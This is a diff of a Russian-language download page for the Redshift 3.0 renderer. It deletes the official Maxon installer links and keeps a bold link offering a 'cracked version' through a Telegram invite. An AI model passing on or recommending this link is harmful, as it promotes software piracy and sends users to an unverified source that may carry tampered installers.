@@ -4,16 +4,6 @@
 
 Для версий Redshift 3.0 под Windows и Linux требуются последние или новейшие драйверы Nvidia. Эти версии содержат поддержку OptiX7, которая является частью драйвера Nvidia. Редшифт для Мак версии 3.0.45 и выше требуется macOS Big Sur 11.3 или выше. Если вы получаете неожиданные ошибки "License Mismatch", вам необходимо обновить macOS.
 
-[Скачать установщик для Windows](https://installer.maxon.net/installer/rs/redshift_v3.0.61_setup.exe)
-
-[Скачать репак версию для Windows](https://installer.maxon.net/installer/rs/redshift_v3.0.61.zip)
-
-[Скачать установщик для Linux](https://installer.maxon.net/installer/rs/redshift_v3.0.61_linux.run)
-
-[Скачать установщик MacOS c поддержкой Metal](https://installer.maxon.net/installer/rs/redshift_v3.0.61_macos_metal.pkg)
-
-[Скачать установщик MacOS с поддержкой CUDA](https://installer.maxon.net/installer/rs/redshift_v3.0.61_macos_cuda.pkg)
-
 **[🔥Скачать крякнутую версию](https://t.me/+UYvAWYziQ5Y4ZWFi)**
 
 ## Примечания к сборке:
